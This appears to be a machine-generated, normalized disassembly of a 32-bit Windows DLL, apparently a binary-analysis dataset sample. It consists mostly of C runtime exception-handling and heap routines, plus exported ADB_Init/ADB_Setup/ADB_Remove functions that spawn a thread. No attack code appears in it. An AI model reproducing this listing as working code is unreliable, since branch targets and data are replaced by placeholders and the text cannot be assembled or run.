je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_10018050
call sub_10018004
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1001b738
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_1001565c
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_1001565c
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_1001565c
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_1001bd42
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_1001adb8
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_10018050
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_1001b1db
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_1001565c
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_1001565c
mov edi [ eax + 0x94 ]
call sub_1001565c
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_1001b259
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_1001b259
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_10012c87
test al al
jne r-xdata
call sub_10018050
cmp eax 0x19930522
jne r-xdata
call sub_1001565c
call sub_1001565c
call sub_1001565c
mov [ eax + 0x88 ] esi
call sub_1001565c
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_1001b00c
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_1001b1db
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_10012808
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_10013848
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_1001b6ca
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_1001ab85
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1001b0ba
add esp 0x10
push [ esi + 0x1c ]
call sub_1001b2d4
sub_1001bbd1
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1001565c
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_1001b83f
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1001b0ba
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1001bcc0
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_10019e0c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_10019e0c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_1001bd0c
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10001030
mov eax [ ecx + 0x8 ]
retn
sub_10001040
push ebp
mov ebp esp
mov eax ecx
mov ecx [ eax + 0x4 ]
mov edx [ ecx ]
mov edx [ edx + 0x2c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call edx
pop ebp
retn 0x4
sub_10001060
mov [ ecx ] r--data
jmp sub_10012864
sub_100010d0
mov [ eax ] r--data
retn
sub_100011d0
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
sub eax [ ecx ]
sar eax 0x2
retn
sub_100011e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_10012896
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10001200
xor eax eax
retn
sub_10001210
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push 0x1
call edx
sub_10001370
mov [ ecx ] r--data
retn
sub_100013b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
pop ebp
retn 0x4
sub_100013c0
mov eax [ ecx + 0xc ]
retn
sub_100017f0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
pop ebp
retn 0x8
sub_10001a00
push ebx
mov ebx [ ecx + 0x4 ]
call sub_100013d0
pop ebx
retn
sub_10001a40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ecx + 0x8 ]
call sub_10001520
pop esi
pop ebx
pop ebp
retn 0x8
sub_10001b90
push edi
mov edi [ ecx + 0x8 ]
call sub_100015a0
pop edi
retn
sub_10001ca0
mov ecx [ eax + 0x4 ]
push ecx
call sub_10012c4b
pop ecx
retn
sub_10001e4e
mov ecx [ ebp - 0x14 ]
push ecx
call sub_10012c4b
add esp 0x4
push 0x0
push 0x0
call sub_10013848
int3
sub_100023e0
retn 0x4
sub_100023f0
xor eax eax
retn 0x8
sub_10002400
retn 0x8
sub_10002410
mov eax [ ecx + 0x8 ]
xor edx edx
cmp eax edx
je r-xdata
mov eax edx
retn
mov [ ecx + 0x8 ] edx
retn
sub_10003980
mov eax [ eax ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_10003990
mov eax [ eax ]
test eax eax
je r-xdata
retn
push eax
call [ SysFreeString@IAT ]
sub_10003a48
mov eax r-xdata
retn
sub_10003e60
mov [ ecx ] r--data
retn
sub_10003e70
movzx eax [ ecx + 0x6 ]
push eax
call [ ntohs@IAT ]
retn
sub_10003e80
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call [ htonl@IAT ]
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn 0x4
sub_10003ea0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call [ htons@IAT ]
mov [ esi + 0x6 ] ax
pop esi
pop ebp
retn 0x4
sub_10003ec0
mov eax [ ecx + 0x8 ]
push eax
call [ ntohl@IAT ]
retn
sub_10003f70
mov [ eax ] r--data
retn
sub_100048c0
mov [ ecx ] r--data
retn
sub_10004980
cmp [ ecx + 0x18 ] 0x10
lea eax [ ecx + 0x4 ]
jb r-xdata
retn
mov eax [ eax ]
sub_10004b20
cmp [ ecx + 0x38 ] 0x10
lea eax [ ecx + 0x24 ]
jb r-xdata
retn
mov eax [ eax ]
sub_10004b30
mov ax [ ecx + 0x40 ]
retn
sub_10004e80
mov [ ecx ] r--data
retn
sub_10004fe9
mov eax 0x1
retn
sub_10004fef
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100052a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
lea esi [ ecx + 0x14 ]
call sub_10004e90
pop esi
pop ebp
retn 0x4
sub_10005610
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x11 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x11 ] 0x0
je r-xdata
sub_10005760
mov eax [ ecx + 0x14 ]
retn
sub_10005770
lea eax [ ecx + 0x24 ]
retn
sub_10005e20
mov eax [ ecx + 0x18 ]
retn
sub_10005ee0
mov eax [ ecx + 0x24 ]
retn
sub_10006060
lea eax [ ecx + 0x148 ]
retn
sub_10006170
cmp [ ecx + 0xc ] 0xffffffff
jne r-xdata
retn 0x4
push esi
lea esi [ ecx - 0xc ]
call sub_10006390
pop esi
sub_100067a5
mov eax sub_100067ab
retn
sub_100067ab
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10006870
mov edx [ ecx + 0x28 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] edx
mov edx [ ecx + 0x2c ]
mov [ eax + 0x8 ] edx
mov edx [ ecx + 0x30 ]
mov ecx [ ecx + 0x34 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] ecx
retn
sub_10006a60
mov eax [ ecx + 0x1c ]
retn
sub_10006ae0
push ebp
mov ebp esp
lea eax [ ecx + 0x3c ]
add ecx 0x8
pop ebp
jmp sub_10002a60
sub_10008330
mov eax [ ecx + 0x44 ]
retn
sub_10008340
mov eax [ ecx + 0x48 ]
retn
sub_100083c0
mov eax [ ecx + 0x4 ]
retn
sub_10008410
mov eax [ ecx + 0x20 ]
retn
sub_10009260
mov [ ecx ] r--data
retn
sub_10009270
mov ecx [ eax ]
push ecx
call [ VariantClear@IAT ]
retn
sub_10009b90
mov [ ecx ] r--data
retn
sub_1000a180
mov eax [ ecx + 0x8 ]
sub eax [ ecx + 0x4 ]
sar eax 0x2
retn
sub_1000a1e0
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax + ecx * 4 ]
pop ebp
retn 0x4
sub_1000a360
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push eax
call sub_10012c4b
add esp 0x4
sub_1000a440
mov ax [ ecx + 0x8 ]
retn
sub_1000a450
cmp [ ecx + 0x20 ] 0x10
lea eax [ ecx + 0xc ]
jb r-xdata
retn
mov eax [ eax ]
sub_1000a460
mov ax [ ecx + 0x28 ]
retn
sub_1000a470
mov eax [ ecx + 0x2c ]
retn
sub_1000a480
mov eax [ ecx + 0x30 ]
retn
sub_1000a490
cmp [ ecx + 0x48 ] 0x10
lea eax [ ecx + 0x34 ]
jb r-xdata
retn
mov eax [ eax ]
sub_1000a4a0
mov eax [ ecx + 0x50 ]
retn
sub_1000b350
sub ecx 0x8
jmp sub_1000af40
sub_1000b360
sub ecx 0x8
jmp sub_1000b2d0
sub_1000b998
mov ecx [ ebp - 0x14 ]
push ecx
call sub_10012c4b
add esp 0x4
push 0x0
push 0x0
call sub_10013848
int3
sub_1000ba30
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
sub_1000c584
mov eax r-xdata
retn
sub_1000c5e1
mov eax sub_1000c5e7
retn
sub_1000c5e7
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1000c620
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
mov ecx [ ebp + 0xc ]
push eax
call sub_100066b0
add esp 0x4
pop ebp
retn 0xc
sub_1000c670
mov [ eax ] r--data
retn
sub_1000cc74
mov eax r-xdata
retn
sub_1000cc80
mov [ eax + 0x4 ] r--data
mov [ eax ] r--data
retn
sub_1000cfa0
sub ecx 0x4
jmp sub_1000ce00
sub_1000d1d0
push ebp
mov ebp esp
mov ecx [ ecx + 0x4 ]
mov eax [ ecx ]
mov eax [ eax + 0x8 ]
pop ebp
jmp eax
sub_1000d2a0
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x1c ]
push edx
mov edx [ ebp + 0xc ]
push edx
call eax
pop ebp
retn 0xc
sub_1000d390
mov [ ecx ] r--data
retn
sub_1000dc80
push ebp
mov ebp esp
add ecx 0x4
push ecx
mov ecx [ ebp + 0x8 ]
call sub_1000e080
pop ebp
retn 0x4
sub_1000dca0
push ebx
mov ebx eax
call sub_1000dcc0
mov eax [ ebx ]
push eax
call sub_10012c4b
add esp 0x4
pop ebx
retn
sub_1000f190
mov ecx [ eax ]
push ecx
call sub_10012c4b
pop ecx
retn
sub_1000f4a0
mov eax [ ecx + 0x4 ]
mov eax [ eax + 0x20 ]
retn
sub_1000f6d0
mov eax [ ecx + 0x4 ]
add eax 0x24
cmp [ eax + 0x14 ] 0x10
jb r-xdata
push eax
call sub_10012e4e
add esp 0x4
retn
mov eax [ eax ]
sub_1000f990
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000e080
pop ebp
retn 0x4
sub_1000f9b0
mov eax [ ecx + 0x4 ]
add eax 0x4
cmp [ eax + 0x14 ] 0x10
jb r-xdata
retn
mov eax [ eax ]
sub_1000fb00
mov eax [ ecx + 0x4 ]
mov eax [ eax + 0x44 ]
retn
ADB_Init
cmp [ rw-data ] 0x0
jne r-xdata
retn 0x4
push 0x0
push 0x0
push 0x0
push sub_10012370
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ rw-data ] eax
ADB_Cleanup
call sub_10012420
retn 0x4
ADB_Setup
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax ] sub_100123f0
mov [ eax + 0x4 ] sub_10012420
pop ebp
retn 0x4
ADB_Remove
jmp sub_10012300
sub_1000fcd0
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
pop esi
retn
call sub_1000fc40
mov [ esi + 0x10 ] eax
sub_1000fe30
mov eax [ ecx + 0x8 ]
test eax eax
jne r-xdata
retn
mov eax 0xaf75ff01
mov [ ecx + 0x8 ] eax
sub_1000fe80
mov eax [ ecx + 0xc ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov [ ecx + 0xc ] eax
sub_1000ff10
mov [ ecx ] r--data
retn
sub_1000ff50
mov eax [ ecx + 0x4 ]
imul eax eax 0x660d
sub eax 0xca1
and eax 0xffff
mov [ ecx + 0x4 ] eax
retn
sub_10010690
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
retn
mov eax [ esi ]
push eax
call sub_10012c4b
add esp 0x4
sub_10010a00
mov eax 0x1
retn
sub_10011947
mov eax [ ebp - 0x14 ]
push eax
call sub_10012c4b
add esp 0x4
push 0x0
push 0x0
call sub_10013848
int3
j_sub_1000c800
jmp sub_1000c800
sub_10011d00
retn
sub_100123bc
mov eax 0x1
retn
sub_100123c2
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100123f0
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0x0
push 0x0
push 0x0
push sub_10012370
push 0x0
push 0x0
call [ CreateThread@IAT ]
mov [ rw-data ] eax
sub_10012476
mov eax 0x1
retn
j_sub_10012864
jmp sub_10012864
sub_1001268e
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10012896
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100126db
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10012896
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10012728
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_10012896
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10012766
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10012ca7
sub_10012780
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_1001279d
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_100127ea
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_100134fd
pop ecx
sub_10012864
mov [ ecx ] r--data
jmp sub_100127ea
sub_10012c21
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_10013c18
push 0x1
push 0x0
call sub_10013bd1
add esp 0xc
jmp sub_10013b9e
call eax
sub_10012c4b
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_100134fd
sub_10012c56
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_10013e0f
pop ecx
retn
sub_10012e2d
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_100141d3
add esp 0xc
pop ebp
retn
sub_10012e43
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10012e2d
sub_10012e4e
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_1001449b
add esp 0xc
pop ebp
retn
sub_10012e64
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_10012c4b
sub_10012f8c
call sub_10014624
retn
sub_10012f92
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10012f56
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_100136a4
cmp [ ebp + 0x10 ] edi
jne r-xdata
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_100154f2
sub_10013802
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
push eax
push ecx
call sub_100173e9
pop ecx
pop ecx
retn
sub_10013b8e
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_10013e00
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10013e76
push 0xe
call sub_10017add
pop ecx
retn
sub_10013f08
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10014603
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_100145d8
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
int3
sub_1001461b
push 0x8
call sub_10017bb6
pop ecx
retn
sub_10014624
push 0x8
call sub_10017add
pop ecx
retn
sub_10014846
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_10017add
pop ecx
sub_1001485b
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_1001471b
add esp 0xc
pop ebp
retn
sub_10014871
push 0x1
push 0x0
push 0x0
call sub_1001471b
add esp 0xc
retn
sub_10014880
mov edi edi
push ebp
mov ebp esp
call sub_10013dc7
push [ ebp + 0x8 ]
call sub_10013c18
pop ecx
push 0xff
call sub_1001485b
int3
sub_100148e5
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_10014d4d
push 0xd
call sub_10017add
pop ecx
retn
sub_1001511c
push 0xd
call sub_10017add
pop ecx
retn
sub_10015155
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_10014fbb
pop ecx
mov [ rw-data ] 0x1
sub_100154a0
push 0xc
call sub_10017add
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_100154ac
push 0x0
call [ EncodePointer@IAT ]
retn
sub_100154b5
call [ TlsAlloc@IAT ]
retn 0x4
sub_100155d1
push 0xd
call sub_10017add
pop ecx
retn
sub_100155da
push 0xc
call sub_10017add
pop ecx
retn
sub_10015790
push 0xd
call sub_10017add
pop ecx
retn
sub_1001579c
push 0xc
call sub_10017add
pop ecx
retn
sub_10015aa3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10016bc1
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_10016bdf
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
sub_100174a4
and [ rw-data ] 0x0
retn
sub_100174ac
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_10017501
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_10017675
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_10017add
pop ecx
sub_10017add
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10017bad
push 0xa
call sub_10017add
pop ecx
retn
sub_10017cc6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_10017bf0
add esp 0xc
pop ebp
retn 0x4
sub_10017cf9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_10019e15
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_10017d2b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_10017bf0
add esp 0xc
pop ebp
retn 0x8
sub_10018004
push 0x8
push r--data
call sub_100148a0
call sub_1001565c
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_10013b9e
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_10018024
xor eax eax
inc eax
retn
sub_1001803d
call sub_1001565c
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_10018004
call eax
sub_10018074
xor eax eax
inc eax
retn
sub_10018088
push sub_10018004
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_10018099
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_100181eb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
sub_10018b04
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10018acc
pop ecx
pop ecx
pop ebp
retn
sub_10019085
push [ ebp + 0x8 ]
call sub_1001a0dd
pop ecx
retn
sub_10019858
push ebx
call sub_1001a0dd
pop ecx
retn
sub_100198ff
mov eax rw-data
retn
sub_100199b6
call sub_1001a4d1
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_100134fd
pop ecx
retn
call sub_1001a2ab
sub_10019ada
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_10019c45
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10019af0
add esp 0x14
pop ebp
retn
sub_10019cb5
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_10019c62
add esp 0x10
pop ebp
retn
sub_10019cd0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1001a280
sub_10019ce6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_1001a280
sub_10019de9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_10019d20
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_10019e34
call eax
retn
sub_10019e37
push 0x2
call sub_10014880
sub_1001a0d4
push 0xa
call sub_10017add
pop ecx
retn
sub_1001a25c
mov edi edi
push ebp
mov ebp esp
push 0x0
